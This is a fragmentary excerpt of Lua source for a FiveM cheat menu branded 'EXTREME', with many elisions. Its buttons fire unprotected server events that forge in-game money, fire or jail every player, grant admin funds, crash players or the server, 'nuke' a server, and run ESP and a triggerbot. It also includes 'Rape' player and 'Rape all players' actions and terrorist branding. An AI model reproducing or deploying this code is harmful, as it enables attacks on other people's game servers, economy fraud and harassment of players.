                ...
                elseif EXTREME.Button('~h~~r~Explode') then
                ...
                elseif EXTREME.Button('~h~~r~Rape') then
                    RequestModelSync('a_m_o_acult_01')
                    RequestAnimDict('rcmpaparazzo_2')
                    while not HasAnimDictLoaded('rcmpaparazzo_2') do
                        Citizen.Wait(0)
                ...
                elseif EXTREME.Button('~h~~r~Cage ~w~Player') then
                ...
                elseif EXTREME.Button('~h~~r~Hamburgher ~w~Player') then
                ...
                elseif EXTREME.Button('~h~~r~Hamburgher ~w~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif EXTREME.Button('~h~~r~Snowball troll ~w~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                ...
                elseif EXTREME.Button('~h~~o~_!_ ~r~CRASH ~w~Player ~o~_!_') then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('SpawnPeds') then
                if EXTREME.Button('~h~~r~Spawn ~w~Swat army with ~y~AK') then
                ...
                elseif EXTREME.Button('~h~~r~Spawn ~w~Swat army with ~y~RPG') then
                    local bQ = 's_m_y_swat_01'
                    local bR = 'weapon_rpg'
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif EXTREME.Button('~h~~r~Spawn ~w~Swat army with ~y~Flaregun') then
                    local bQ = 's_m_y_swat_01'
                ...
                elseif EXTREME.Button('~h~~r~Spawn ~w~Swat army with ~y~Railgun') then
                    local bQ = 's_m_y_swat_01'
            ...
            elseif
             ...
             then
                if mhaonn then
                    EXTREME.OpenMenu('EXTREME-T')
                else
                    bE()
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('TeleportMenu') then
                if EXTREME.Button('~h~Teleport to ~g~waypoint') then
                    c6()
                elseif EXTREME.Button('~h~Teleport into ~g~nearest ~w~vehicle') then
                    b_()
                elseif EXTREME.Button('~h~Teleport to ~r~coords') then
                    bT()
                elseif EXTREME.Button('~h~Draw custom ~r~blip ~w~on map') then
                    bX()
                elseif
                    EXTREME.CheckBox(
                        '~h~Show ~g~Coords',
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('WeaponMenu') then
                if EXTREME.MenuButton('~h~~r~#~w~ Give Single Weapon', 'WeaponTypes') then
                elseif EXTREME.Button('~h~~g~Give All Weapons') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(PlayerPedId(-1), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif EXTREME.Button('~h~~r~Remove All Weapons') then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
                elseif EXTREME.Button('~h~Drop your current Weapon') then
                    local ak = GetPlayerPed(-1)
                    local b = GetSelectedPedWeapon(ak)
                    SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)
                elseif EXTREME.Button('~h~~g~Give All Weapons to ~w~everyone') then
                    for el = 0, 128 do
                ...
                elseif EXTREME.Button('~h~~r~Remove All Weapons from ~w~everyone') then
                    for el = 0, 128 do
                        if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                            for i = 1, #b6 do
                ...
                elseif EXTREME.Button('~h~Give Ammo') then
                    for i = 1, #b6 do
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bl) do
                    if dE.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if EXTREME.MenuButton(dE.name, dE.id) then
                        end
                    elseif dE.id == 'neon' then
                        if EXTREME.MenuButton(dE.name, dE.id) then
                        end
                ...
                if EXTREME.Button('Xenon Headlight', xenonStatus) then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bm) do
                    if EXTREME.MenuButton(dE.name, dE.id) then
                    end
                ...
                if EXTREME.Button('~h~~w~Turbo ~h~Tune', turboStatus) then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('primary') then
                EXTREME.MenuButton('~h~~r~#~w~ Classic', 'classic1')
                EXTREME.MenuButton('~h~~r~#~w~ Metallic', 'metallic1')
                EXTREME.MenuButton('~h~~r~#~w~ Matte', 'matte1')
                EXTREME.MenuButton('~h~~r~#~w~ Metal', 'metal1')
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('secondary') then
                EXTREME.MenuButton('~h~~r~#~w~ Classic', 'classic2')
                EXTREME.MenuButton('~h~~r~#~w~ Metallic', 'metallic2')
                EXTREME.MenuButton('~h~~r~#~w~ Matte', 'matte2')
                EXTREME.MenuButton('~h~~r~#~w~ Metal', 'metal2')
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('rimpaint') then
                EXTREME.MenuButton('~h~~r~#~w~ Classic', 'classic3')
                EXTREME.MenuButton('~h~~r~#~w~ Metallic', 'metallic3')
                EXTREME.MenuButton('~h~~r~#~w~ Matte', 'matte3')
                EXTREME.MenuButton('~h~~r~#~w~ Metal', 'metal3')
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('classic1') then
                for dK, em in pairs(br) do
                    ...
                    if EXTREME.Button(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('metallic1') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('matte1') then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('metal1') then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('classic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('metallic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('matte2') then
                for dK, em in pairs(bt) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('metal2') then
                for dK, em in pairs(bu) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('classic3') then
                for dK, em in pairs(br) do
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('metallic3') then
                for dK, em in pairs(br) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('matte3') then
                for dK, em in pairs(bt) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('metal3') then
                for dK, em in pairs(bu) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('VehicleMenu') then
                if EXTREME.MenuButton('~h~~r~#~w~ ~h~~w~LSC ~w~Customs', 'LSC') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ Vehicle ~g~Boost', 'BoostMenu') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ Vehicle List', 'CarTypes') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ Global Car Trolls', 'GCT') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ Spawn & Attach ~w~Trailer', 'MainTrailer') then
                elseif EXTREME.Button('~h~Spawn ~r~Custom ~w~Vehicle') then
                    ca()
                elseif EXTREME.Button('~h~~r~Delete ~w~Vehicle') then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif EXTREME.Button('~h~~g~Repair ~w~Vehicle') then
                    cc()
                elseif EXTREME.Button('~h~~g~Repair ~w~Engine') then
                    cd()
                elseif EXTREME.Button('~h~~g~Flip ~w~Vehicle') then
                    daojosdinpatpemata()
                elseif EXTREME.Button('~h~~w~Max ~w~Tuning') then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif EXTREME.Button('~h~~g~RC ~w~Car') then
                    ce()
                    EXTREME.CloseMenu()
                elseif
                    EXTREME.CheckBox(
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('GCT') then
                if
                    EXTREME.CheckBox(
                        '~h~~r~EMP~w~ Nearest Vehicles',
                        destroyvehicles,
                        function(dR)
                            destroyvehicles = dR
                        end
                ...
                elseif
                    EXTREME.CheckBox(
                        '~h~~r~Delete~w~ Nearest Vehicles/Entity',
                ...
                elseif
                    EXTREME.CheckBox(
                        '~h~~r~Explode~w~ Nearest Vehicles',
                        explodevehicles,
                        function(dR)
                            explodevehicles = dR
                        end
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('LuaMenu') then
                if EXTREME.MenuButton('~h~~r~#~w~ ~r~ESX ~w~Boss', 'ESXBoss') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ ~r~ESX ~w~Money', 'ESXMoney') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ ~r~ESX ~w~Jobs', 'ESXJobs') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ ~r~ESX ~w~Misc', 'ESXCustom') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ ~r~ESX ~w~Drugs', 'ESXDrugs') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ ~y~VRP ~w~Triggers', 'VRPTriggers') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ ~w~Misc ~w~Triggers', 'MiscTriggers') then
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('ESXJobs') then
                if EXTREME.Button('~h~Fire all players') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:destituerplayer', GetPlayerServerId(ak))
                        UnemployedPlayers()
                    end
                elseif EXTREME.Button('~h~Set all ~w~Police ~w~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'police', 3)
                        PolicePlayers()
                    end
                elseif EXTREME.Button('~h~Set all ~o~Mecano ~w~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'mecano', 3)
                        MecanoPlayers()
                    end
                elseif EXTREME.Button('~h~Set all ~y~Taxi ~w~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'taxi', 3)
                        TaxiPlayers()
                    end
                elseif EXTREME.Button('~h~Set all ~r~Ambulance ~w~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'ambulance', 3)
                        AmbulancePlayers()
                    end
                elseif EXTREME.Button('~h~Set all ~g~Real Estate ~w~Job') then
                    for ak = 0, 128 do
                        TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'realestateagent', 3)
                        RealEstateAgentPlayers()
                    end
                elseif EXTREME.Button('~h~Set all ~r~Car ~w~Dealer ~w~Job') then
                    for ak = 0, 128 do
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('ESXBoss') then
                if EXTREME.Button('~w~~h~Mechanic~w~ Boss Menu') then
                    TriggerEvent(
                    ...
                    EXTREME.CloseMenu()
                elseif EXTREME.Button('~w~~h~Police~w~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'police',
                        function(en, eo)
                    ...
                    EXTREME.CloseMenu()
                elseif EXTREME.Button('~r~~h~Ambulance~w~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'ambulance',
                        function(en, eo)
                    ...
                    EXTREME.CloseMenu()
                elseif EXTREME.Button('~y~~h~Taxi~w~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'taxi',
                        function(en, eo)
                    ...
                    EXTREME.CloseMenu()
                elseif EXTREME.Button('~g~~h~Real Estate~w~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'realestateagent',
                        function(en, eo)
                    ...
                    EXTREME.CloseMenu()
                elseif EXTREME.Button('~o~~h~Car Dealer~w~ Boss Menu') then
                    TriggerEvent(
                        'esx_society:openBossMenu',
                        'cardealer',
                        function(en, eo)
                    ...
                    EXTREME.CloseMenu()
                elseif EXTREME.Button('~y~~h~Custom~w~ Boss Menu') then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('ESXMoney') then
                if EXTREME.Button('~h~~o~Automatic Money ~r~ WARNING!') then
                    automaticmoneyesx()
                elseif EXTREME.Button('~g~~h~ESX ~y~Caution Give Back') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_jobs:caution', 'give_back', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Eden Garage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
				...
				elseif EXTREME.Button('~g~~h~ESX ~y~Air Cargo') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_fork:getPaid', m)
                    end	
                elseif EXTREME.Button('~g~~h~ESX ~y~Fuel Delivery') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_fueldelivery:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Car Thief') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~DMV School') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'esx_dmvschool:pay',
                ...
                elseif EXTREME.Button('~g~~h~FUEL ~y~Legacy Fuel') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'LegacyFuel:PayFuel',
                ...
                elseif EXTREME.Button('~g~~h~ESX ~y~Dirty Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_godirtyjob:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Pizza Boy') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_pizza:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Ranger Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_ranger:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Garbage Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_garbagejob:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY') then
                    local m = KeyboardInput('Enter amount of dirty money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Trucker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_truckerjob:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Admin Give Bank') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveBank', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Admin Give Cash') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveCash', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Postal Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_gopostaljob:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Banker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_banksecurity:pay', m)
                    end
                elseif EXTREME.Button('~g~~h~ESX ~y~Slot Machine') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_slotmachine:sv:2', m)
                    end
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('ESXCustom') then
                if EXTREME.Button('~w~~h~Set hunger to ~h~~g~100') then
                    TriggerEvent('esx_status:set', 'hunger', 1000000)
                elseif EXTREME.Button('~w~~h~Set thirst to ~h~~g~100') then
                    TriggerEvent('esx_status:set', 'thirst', 1000000)
                elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Brinks Job') then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Mechanic Job') then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Police Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Taxi Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Unicorn Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~VehicleShop') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Admin Tool') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
					local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Cartle Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~MC Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Gang Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Bloods Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Lost Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Mafia Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
					...
					elseif EXTREME.Button('~h~Drop Any ~g~Item ~h~From ~o~Taliban Job') then
                    local a = KeyboardInput('Enter Item Name', '', 100)
                    if a then
                        local b = KeyboardInput('Enter Amount', '', 100)
                        if b then
				...
				elseif EXTREME.Button('~g~~h~ESX ~r~Revive') then
                ...
                elseif EXTREME.Button('~g~~h~ESX ~w~Handcuff') then
                    local f = KeyboardInput('Enter Player ID or all', '', 1000)
                    if f then
                        if f == 'all' then
                            for i = 0, 128 do
                ...
                elseif EXTREME.Button('~h~Get Driving License') then
                    TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
                    TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
                elseif EXTREME.Button('~h~~w~Buy ~w~a vehicle for ~g~free') then
                    cv()
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('ESXDrugs') then
                
if EXTREME.Button('~h~~g~pickup cannabis') then
                    pcann()
				elseif EXTREME.Button('~h~~y~process cannabis') then
                    pscann()
				elseif EXTREME.Button('~h~~g~Harvest Weed') then
                    hweed()	
				elseif EXTREME.Button('~h~~y~Transform Weed') then
                    tweed()
                elseif EXTREME.Button('~h~~o~Sell Weed') then
                    sweed()
                elseif EXTREME.Button('~h~~g~Harvest Coke') then
                    hcoke()
                elseif EXTREME.Button('~h~~y~Transform Coke') then
                    tcoke()
                elseif EXTREME.Button('~h~~o~Sell Coke') then
                    scoke()
                elseif EXTREME.Button('~h~~g~Harvest Meth') then
                    hmeth()
                elseif EXTREME.Button('~h~~y~Transform Meth') then
                    tmeth()
                elseif EXTREME.Button('~h~~o~Sell Meth') then
                    smeth()
                elseif EXTREME.Button('~h~~g~Harvest Opium') then
                    hopi()
                elseif EXTREME.Button('~h~~y~Transform Opium') then
                    topi()
                elseif EXTREME.Button('~h~~o~Sell Opium') then
                    sopi()
                elseif EXTREME.Button('~h~~y~Money Wash') then
                    mataaspalarufe()
				 elseif EXTREME.Button('~h~~y~Money Wash') then
                    mataaspalarufe1()	
                elseif EXTREME.Button('~r~~h~Stop all') then
                    matanumaispalarufe()
                elseif
                    EXTREME.CheckBox(
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('VRPTriggers') then
                if EXTREME.Button('~r~~h~VRP ~w~Give Money ~ypayGarage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'lscustoms:payGarage',
                ...
                elseif EXTREME.Button('~r~~h~VRP ~g~WIN ~w~Slot Machine') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                ...
                elseif EXTREME.Button('~r~~h~VRP ~w~Get driving license') then
                    TriggerServerEvent('dmv:success')
                elseif EXTREME.Button('~r~~h~VRP ~w~Bank Deposit') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('Banca:deposit', m)
                        TriggerServerEvent('bank:deposit', m)
                    end
                elseif EXTREME.Button('~r~~h~VRP ~w~Bank Withdraw ') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('MiscTriggers') then
                if EXTREME.Button('~h~Send Discord Message') then
                ...
                elseif EXTREME.Button('~h~Send Fake Message') then
                ...
                elseif EXTREME.Button('~h~~g~ESX ~y~CarThief ~w~TROLL') then
                    av('~y~esx_carthief ~g~required', true)
                    av('~g~Trying to send alerts', false)
                    carthieftroll()
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('AdvM') then
                if EXTREME.MenuButton('~h~~r~#~w~ Destroyer Menu', 'Destroyer') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ ESP Menu', 'ESPMenu') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ Crosshairs', 'CsMenu') then
                elseif
                    EXTREME.CheckBox(
                        '~h~TriggerBot',
                        TriggerBot,
                ...
                elseif
                 ...
                 then
                elseif EXTREME.Button('~h~~r~BORGAR~w~ Everyone') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = GetHashKey(eb)
                ...
                elseif EXTREME.Button('~h~~o~Discord RPC~w~ Add/Remove') then
                    h = not h
                    if not h then
                        SetRichPresence(0)
                        SetDiscordAppId(0)
                ...
                elseif
                    EXTREME.CheckBox(
                        '~h~~r~Ra~g~nd~w~om ~w~Notification Color',
                        rgbnot,
                        function(dR)
                            rgbnot = dR
                        end
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('CsMenu') then
                if
                    EXTREME.CheckBox(
                        '~h~~y~Original ~w~Crosshair',
                        crosshair,
                        function(dR)
                            crosshair = dR
                            crosshairc = false
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('Destroyer') then
                if EXTREME.Button('~h~~r~Nuke ~w~Server') then
                    nukeserver()
                elseif
                    EXTREME.CheckBox(
                        '~h~~r~Silent ~w~Server ~y~Crasher',
                        servercrasherxd,
                        function(dR)
                            servercrasherxd = dR
                        end
                 ...
                 then
                elseif EXTREME.Button('~h~~g~ESX ~r~Destroy ~w~v2') then
                    esxdestroyv2()
                elseif EXTREME.Button('~h~~g~ESX ~r~Destroy ~w~Salary') then
                    EconomyDy2()
                elseif EXTREME.Button('~h~~r~VRP ~w~Give everyone money') then
                    vrpdestroy()
                elseif EXTREME.Button('~h~~g~ESX ~w~Give everyone money') then
                    giveeveryone()
                elseif EXTREME.Button('~h~~r~Jail~w~ All players') then
                    for i = 0, 128 do
                        TriggerServerEvent(
                        ...
                        TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 45 * 60, 'EXTREME TERRORIST')
                    end
                elseif EXTREME.Button('~h~~r~Banana ~r~Party~w~ All players') then
                    bananapartyall()
                elseif EXTREME.Button('~h~~r~Rape~w~ All players') then
                    RapeAllFunc()
                elseif EXTREME.Button('~h~~r~Cage~w~ All players') then
                    for i = 0, 255 do
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('crds') then
                if EXTREME.Button('~h~~r~--->~w~ EXTREME ~r~TERRORIST ~y~;)') then
                    av('~h~~o~WELCOME TO THE EXTREME WORLD~w~.', false)
                    av('GO EXTREME IN A SMART WAY', false)
                    av('TAKE DOWN ONLY WHO DERVES IT!', false)
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('WeaponTypes') then
                for e0, ev in pairs(b7) do
                    if EXTREME.MenuButton('~h~~r~#~w~ ' .. e0, 'WeaponTypeSelection') then
                        dy = ev
                    end
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('WeaponTypeSelection') then
                for e0, ev in pairs(dy) do
                    if EXTREME.MenuButton(ev.name, 'WeaponOptions') then
                        dz = ev
                    end
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('WeaponOptions') then
                if EXTREME.Button('~h~~r~Spawn Weapon') then
                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false)
                end
                if EXTREME.Button('~h~~g~Add Ammo') then
                ...
                for e0, ev in pairs(dz.mods) do
                    if EXTREME.MenuButton('~h~~r~#~w~ ~h~~r~> ~w~' .. e0, 'ModSelect') then
                        dA = ev
                    end
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('ModSelect') then
                for _, ev in pairs(dA) do
                    if EXTREME.Button(ev.name) then
                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
                    end
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('CarTypes') then
                for i, ex in ipairs(b3) do
                    if EXTREME.MenuButton('~h~~r~#~w~ ' .. ex, 'CarTypeSelection') then
                        carTypeIdx = i
                    end
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('CarTypeSelection') then
                for i, ex in ipairs(b4[carTypeIdx]) do
                    if EXTREME.MenuButton('~h~~r~#~w~ ~h~~r~>~w~ ' .. ex, 'CarOptions') then
                        carToSpawn = i
                    end
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('CarOptions') then
                if EXTREME.Button('~h~~r~Spawn Car') then
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('MainTrailer') then
                if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                    for i, ex in ipairs(b5) do
                        if EXTREME.MenuButton('~h~~r~#~w~ ~h~~r~>~w~ ' .. ex, 'MainTrailerSpa') then
                            TrailerToSpawn = i
                        end
                    end
                else
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('MainTrailerSpa') then
                if EXTREME.Button('~h~~r~Spawn Car') then
                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('GiveSingleWeaponPlayer') then
                for i = 1, #b6 do
                    if EXTREME.Button(b6[i]) then
                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, true)
                    end
                end
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('ESPMenu') then
                if
                    EXTREME.CheckBox(
                ...
                EXTREME.Display()
            elseif EXTREME.IsMenuOpened('LSC') then
                local veh = GetVehiclePedIsUsing(PlayerPedId())
                if EXTREME.MenuButton('~h~~r~#~w~ ~h~~r~Exterior ~w~Tuning', 'tunings') then
                elseif EXTREME.MenuButton('~h~~r~#~w~ ~h~~r~Performance ~w~Tuning', 'performance') then
                elseif EXTREME.Button('~h~Change Car License Plate') then
                    cu()
                elseif
                    EXTREME.CheckBox(
                        '~h~~g~R~r~a~y~i~w~n~o~w~r~o~g~w ~w~Vehicle Colour',
                        RainbowVeh,
                        function(dR)
                            RainbowVeh = dR
                        end
                 ...
                 then
                elseif EXTREME.Button('~h~Make vehicle ~y~dirty') then
                    Clean(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif EXTREME.Button('~h~Make vehicle ~g~clean') then
